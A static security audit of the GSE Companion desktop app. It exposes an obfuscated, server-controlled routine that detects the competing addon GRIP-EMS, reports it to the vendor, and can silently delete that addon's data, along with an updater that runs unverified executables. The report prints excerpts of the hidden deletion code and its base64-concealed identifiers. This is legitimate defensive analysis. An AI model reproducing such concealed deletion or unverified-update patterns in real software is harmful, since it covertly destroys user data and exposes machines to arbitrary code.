# GSE Companion 0.4.14 — Static Security Audit

> Created: 2026-06-20
> Subject: GSE Companion Setup 0.4.14.exe
> Installer SHA-256: `24b64bc72d9c56095c7c92b331842a205be6dd3f23830dddab4a850f9f58dbd0`
> Size: 81,296,884 bytes
> Publisher (per manifest): TimothyLuke / admin@gse.tools / homepage gse.tools
> Method: full static unpack + line-by-line read. No code was executed.

## What it is

A Windows/macOS/Linux Electron desktop app whose stated purpose (package.json) is
"WoW SavedVariables sync for GSE Tools." It logs in to gse.tools / qik.dev, reads the
GSE addon's SavedVariables, uploads your GSE sequences/macros/variables to the website,
downloads updates back, and installs/updates the in-game GSE addon. It ships a small
in-game "bridge" addon (GSE_Companion) so the website and the game can exchange data.

Unpack chain: NSIS installer -> standard Electron runtime + `resources/app.asar`
(first-party code) + `resources/app.asar.unpacked` (native modules) + `resources/addon`
(the 3-file in-game bridge addon) + `app-update.yml` (a stock electron-builder config naming a GitHub source,
`TimothyLuke/GSE-Companion`). The app bundles no electron-updater and never reads this file; the real updater uses api.qik.dev (Finding 3), and no public repo by that name exists. 86 payload files + 512 asar files enumerated and hashed
(see `evidence/file_manifest_0.4.14.txt`).

## Verdict

The app is, in the main, what it claims to be, and most of it is unremarkable. The
dependency tree is stock and unmodified; the renderer is correctly sandboxed; the
in-game bridge addon respects user consent. Two things stand out and do not fit the
"just a sync tool" description:

1. CRITICAL — a deliberately hidden, server-controlled routine that detects the
   competing addon GRIP-EMS, reports its presence to gse.tools, and can delete data
   out of GRIP-EMS's saved file on the user's disk. Currently dormant (server flag off)
   but remotely activatable.
2. HIGH — the auto-updater downloads and silently runs an installer with no signature
   or hash verification (remote-code-execution exposure if the update server is
   compromised, spoofed, or MITM'd). Default is auto-apply.

Everything else is LOW/INFO.

---

## Finding 1 (CRITICAL) — Obfuscated, server-gated deletion of a competitor's data

File: `out/main/index.js`.

### 1a. The only obfuscated strings in the whole app are your addon's identifiers

The entire 3,240-line main process is plain text — its own filenames ("GSE.lua"),
table names ("GSESequences"), and API URLs are all unencoded. There are exactly four
base64-encoded string literals in the codebase, decoded at runtime by a one-line helper
at L551 `const kt = (e) => Buffer.from(e, "base64").toString("utf8")`:

    R1JJUC1FTVMubHVh           -> GRIP-EMS.lua
    R1JJUF9FTVNfQ0hBUg==       -> GRIP_EMS_CHAR
    cHJvdmVuYW5jZVNvdXJjZQ==   -> provenanceSource
    Z3NlLWxlZ2FjeQ==           -> gse-legacy

These are precisely the strings someone auditing the binary would grep for ("GRIP",
"EMS"). Encoding only the competitor's identifiers, while leaving every first-party
string in plain text, is concealment, not coincidence. (Confirmed: a base64 sweep of
main, the renderer bundle, and all node_modules found no other obfuscated identifiers. The app's import decoder at L309 also calls base64, but to decode the import strings a user pastes, not to hide a constant.)

### 1b. Detection — scanning the disk for GRIP-EMS

`Rs` (L552), `Bs` (L585), `Gs` (L593) walk every configured WoW path -> every account
-> every character SavedVariables folder, looking for `GRIP-EMS.lua`. `Bs` returns "is
GRIP-EMS installed anywhere" and `Gs` returns the full list of every `GRIP-EMS.lua`
path found.

### 1c. Reporting your competitor use to the server

`At` (L2547, the "policy" function) sets `restricted = (GRIP-EMS present)` and calls
`Us` (L644), which PATCHes the user's gseMember record on `api.qik.dev` to set
`data.restrictedAccount = true/false` to match. So the fact that you run GRIP-EMS is
uploaded and stored against your account.

### 1d. The deletion

`At` then fetches `https://api.gse.tools/settings/access-policy` (`Ks`, L629) to read a
server flag `enforce`. The gate (L2563):

    if (ie.restricted && ie.enforce) { ...purge... }

i.e. if GRIP-EMS is present AND the server says enforce. It first checks WoW is closed
(so the write is not overwritten on logout and the user does not see it happen), then
runs `_o` (L2574) -> `zs` (L703) per GRIP-EMS file:

    function zs(e, t) {                     // e = path to GRIP-EMS.lua, t = your GSE seq names
      const n = be(e);                      // parse GRIP-EMS SavedVariables
      const o = n[Ms]?.sequences;           // n.GRIP_EMS_CHAR.sequences
      for (const [l, u] of Object.entries(o)) {
        const h = u[Vs] === Ns;             // u.provenanceSource === "gse-legacy"
        const w = t?.has?.(l);              // OR the EMS sequence name matches a GSE name
        (h || w) && a.push(l);
      }
      for (const l of a) delete o[l];       // delete them from EMS data
      // atomic temp-file write + rename back over GRIP-EMS.lua
    }

It rewrites your GRIP-EMS.lua with those sequences removed, atomically (temp +
rename). `Zn` (L2593) re-runs the whole detect/report/enforce cycle every 10 minutes
(`$o = 10 * 60 * 1e3`, L2545), and it also runs at login and after every `auth:me`.

### 1e. Two aggravating details

- The purge is not limited to GSE-origin content. The condition is
  `provenanceSource === "gse-legacy"` OR `name matches a current GSE sequence`. A
  sequence built natively in EMS is deleted just for sharing a name with a GSE one.
- The same author's in-game bridge addon (`resources/addon/GSE_Companion.lua`)
  requires explicit, per-item user confirmation to delete GSE's OWN sequences — its
  comment reads "destructive actions stay friction-y by design ... there is
  intentionally no auto-accept-deletes." The competitor deletion is the one path that
  is silent and unconsented, done from the desktop side specifically while the game is
  closed. They know deletions should be consented; this one is routed around consent.

### 1f. Current live state (captured 2026-06-20)

A direct GET to `https://api.gse.tools/settings/access-policy` returns:

    {"enforce":false,"updatedAt":null}

So the switch is OFF right now — the deletion is not currently firing for anyone. It is
an armed, dormant, remotely-controlled mechanism. The operator can set `enforce:true`
unilaterally at any time; within ~10 minutes (or next login) it would begin deleting
GRIP-EMS data on every EMS user who runs the Companion, with no notice.

---

## Finding 2 (HIGH) — Competitor-presence surveillance

Covered by 1c above but called out separately: independent of whether the deletion ever
fires, the app silently profiles whether you use a competitor and reports it to the
vendor's backend tied to your account (`restrictedAccount`). This happens on login and
every 10 minutes regardless of the `enforce` flag.

---

## Finding 3 (HIGH) — Auto-updater runs an unverified executable

File: `out/main/index.js`, updater block ~L3099-3231.

- Update metadata: POST `https://api.qik.dev/content/gseCompanionRelease/list`.
- Binary download: GET `https://api.qik.dev/file/<id>` -> `os.tmpdir()/gse-companion-update.exe`.
- Execution (`es`, L3152; spawn L3162): Windows `spawn(downloaded, ["/S","--force-run"], {detached, stdio:"ignore"})`;
  Linux chmod 0755 + rename over AppImage + spawn; macOS `open`.
- No signature, no hash, no code-signing check on the downloaded file before it runs. The installers are unsigned too: `Get-AuthenticodeSignature` reports NotSigned on every Companion build tested, back to 0.4.12.
- Default `autoApplyUpdates: true` (L21) + 4-hour poll: a higher advertised version
  triggers background download then silent install with no user click.

Impact: a compromised/spoofed/MITM'd `api.qik.dev` can push an arbitrary executable that
runs on the user's machine. Transport is HTTPS and the version is compared, but neither
authenticates the binary's contents. This is a general supply-chain weakness, not part
of the EMS targeting, but it is the highest classical-security risk in the app.

---

## Finding 4 (LOW/INFO) — Server-initiated diagnostic upload

`io` (≈L1098), triggered by a server-pushed `companion:request` SSE event, POSTs to
`https://api.gse.tools/diagnostic/upload/<id>`: full `GSE.lua` + `GSE_Companion.lua`
contents and their absolute paths, the in-memory console log ring, and a settings dump.
The settings dump is scrubbed of `accessToken`/`userSession` (L1135-1136) and the bearer
token rides in the header, not the body — good. Caveat: the GSE SavedVariables blobs are
uploaded raw/unredacted, and only fires for an authenticated user. Only GSE's own files
are touched. Low risk, noted for completeness.

---

## Finding 5 (LOW) — Minor hardening gaps

- `shell:open-external` (L3084) passes the renderer-supplied string straight to
  `shell.openExternal` with no scheme allow-list.
- `api:request` (L2371) concatenates a renderer path onto `https://api.qik.dev` with no
  leading-slash / `..` normalization (host is fixed, so not full SSRF).
- `gse:install` / `gse:uninstall` (L3037-3083) extract a server ZIP with adm-zip
  `extractAllTo` and later `rmSync` folder names derived from that ZIP, with no
  path-traversal guard. Uninstall is otherwise scoped to `<client>/Interface/AddOns/`
  and to names equal to `GSE` or starting `GSE_`. Low likelihood, needs a compromised
  release server.

---

## What is clean (for fairness and to bound the claims)

- No `eval`, `new Function`, or dynamic `require`/`import` of attacker-controlled
  strings anywhere in the app (the one `import("@qikdev/sdk")` is a constant).
- Renderer is correctly sandboxed: context isolation, no `nodeIntegration`, all Node
  access via a finite typed `window.api` preload bridge, no `ipcRenderer`/`require`
  in the renderer, and a strict CSP (`script-src 'self'`; `connect-src` limited to
  gse.tools / api.qik.dev / *.amazonaws.com / localhost). No tokens in localStorage.
- Dependency tree is stock and unmodified: every one of 50+ packages resolves to a real
  npm package at a normal version, zero install/lifecycle scripts, no network beacons,
  no obfuscation. Native binaries identified and hashed:
  - `cbor-extract` `node.napi.node` (CBOR decoder) SHA-256 `36c2d44b9d7b284f393dd9cc425da5ca90511d90717914f7af5d432b2d3ff5dd`
  - `ps-list` `fastlist-0.3.0-x64.exe` (process list, used to detect running WoW) SHA-256 `d1a71f9ac1728082c1b276392725c3e010b98714888579b99152e401abedbf11`
  - `ps-list` `fastlist-0.3.0-x86.exe` SHA-256 `017411f3b0b5c0402cc3b2cb87c32c6fc71abd82e5b17ea6108990096c75a65d`
- `child_process` is used only for `tasklist`/`ps` (read-only WoW-running detection) and
  the updater spawn. No hidden shells, no registry/persistence/autolaunch writes.
- No hardcoded IP C2, no analytics/telemetry domains, no credential exfiltration. The
  only data uploaded is GSE content (tagged with the WoW account-folder name, in-addon
  author, class/spec/expansion) + app-version/OS-platform telemetry headers. No
  Battle.net login, hostname, MAC, or real character names.
- The in-game bridge addon only touches GSE's own tables and requires confirmation for
  deletes.

---

## Bottom line

Outside the two flagged items the Companion is a normal, competently-built sync app. But
it also contains an intentionally concealed, vendor-controlled mechanism that surveils
for a named competitor (GRIP-EMS) and can remotely delete that competitor's user data
from disk without consent. That behavior is hidden behind the only base64-obfuscated identifiers in
the program and is deliberately routed around the very consent prompt the same author
built for deleting his own addon's data. It is dormant today (server flag off) but can be
switched on remotely at any time.

## Appendix — key locations (out/main/index.js)

    L551    base64 decoder + 4 hidden identifiers
    L552    Rs   - detect GRIP-EMS.lua on disk
    L585    Bs   - "is GRIP-EMS present anywhere"
    L593    Gs   - enumerate all GRIP-EMS.lua paths
    L629    Ks   - GET /settings/access-policy (server enforce flag)
    L644    Us   - PATCH restrictedAccount flag to server
    L690    Ls   - read user's current GSE sequence names
    L703    zs   - delete sequences from GRIP-EMS.lua
    L2547   At   - policy orchestrator (login + auth:me + timer)
    L2574   _o   - runs zs over every GRIP-EMS file
    L2593   Zn   - 10-minute interval
    L3074   gse:uninstall (GSE/GSE_* scoped rmSync)
    L3152   es   - download + silently spawn updater installer
    L3186   ns   - GET api.qik.dev/file/<id>


## Scope and limitations

- Static only. The application was never executed; every finding is from reading extracted files.
- Runtime: the app ships Electron 32.3.3 / Chromium 128.0.6613.186. The 71 binary runtime files
  (Electron/Chromium DLLs, .pak/.dat resource bundles, the electron-builder elevate.exe UAC helper,
  V8 snapshots) were treated as the stock Electron distribution by name and version and were hashed
  but not individually reverse-engineered or compared to official Electron release hashes. All
  audited behavior lives in the application JavaScript (app.asar), which is the layer an addon
  author would realistically change; a custom-recompiled Electron runtime would be a far larger and
  unnecessary effort.
- Coverage: out/main/index.js (3,240 lines) was read in full. The security-critical regions
  (detection/flag/purge subsystem, IPC surface, file I/O, child_process, auto-updater, in-game
  bridge addon, preload, renderer entry, dependency manifest) were read directly; the bulk sync-
  engine middle was read with parallel reviewers and the load-bearing claims (the four hashes, the
  base64 finding, the CSP, the diagnostic upload, the policy timer) were then re-verified directly.
- Extraction completeness: the NSIS installer extracted to 86/86 payload files; the 7-Zip "data
  after the end of archive" warning is NSIS overlay data appended after the archive, not a dropped
  file. It is not an Authenticode signature: `Get-AuthenticodeSignature` reports NotSigned for this
  installer, and for every Companion installer tested (0.4.12, 0.4.14, 0.4.19, 0.4.23, 0.4.24, 0.4.26). The
  app.asar extracted to 512 files and parsed without error.
- Not determinable from the client: whether the server enforce flag is ever set true. It read false
  on 2026-06-20.
